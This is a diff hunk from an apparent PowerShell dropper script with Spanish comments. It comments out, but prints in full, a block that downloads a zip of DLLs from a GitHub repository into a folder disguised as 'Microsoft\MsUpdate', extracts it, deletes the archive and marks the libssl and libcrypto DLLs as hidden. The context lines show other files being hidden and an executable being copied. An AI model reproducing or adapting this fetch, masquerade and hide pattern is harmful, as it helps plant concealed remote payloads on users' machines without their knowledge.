@@ -23,15 +23,15 @@ Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultos
 
 #Copy DLLs
 # Definir rutas locales y URL remota
-$rutaLocalDLL = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
-$urlRemotoDLL = "https://github.com/emakedie/UCN/raw/refs/heads/main/libcryp.zip"
-$zipFile = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
-$destination = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\"
-    Invoke-WebRequest -Uri $urlRemotoDLL -OutFile $rutaLocalDLL
-    Expand-Archive -Path $zipFile -DestinationPath $destination -Force
-    Remove-Item -Path $zipFile -Force
-Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libssl-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcrypto-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+#$rutaLocalDLL = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
+#$urlRemotoDLL = "https://github.com/emakedie/UCN/raw/refs/heads/main/libcryp.zip"
+#$zipFile = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
+#$destination = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\"
+#    Invoke-WebRequest -Uri $urlRemotoDLL -OutFile $rutaLocalDLL
+#    Expand-Archive -Path $zipFile -DestinationPath $destination -Force
+#    Remove-Item -Path $zipFile -Force
+#Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libssl-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+#Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcrypto-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
 
 # Copy Ejecuter
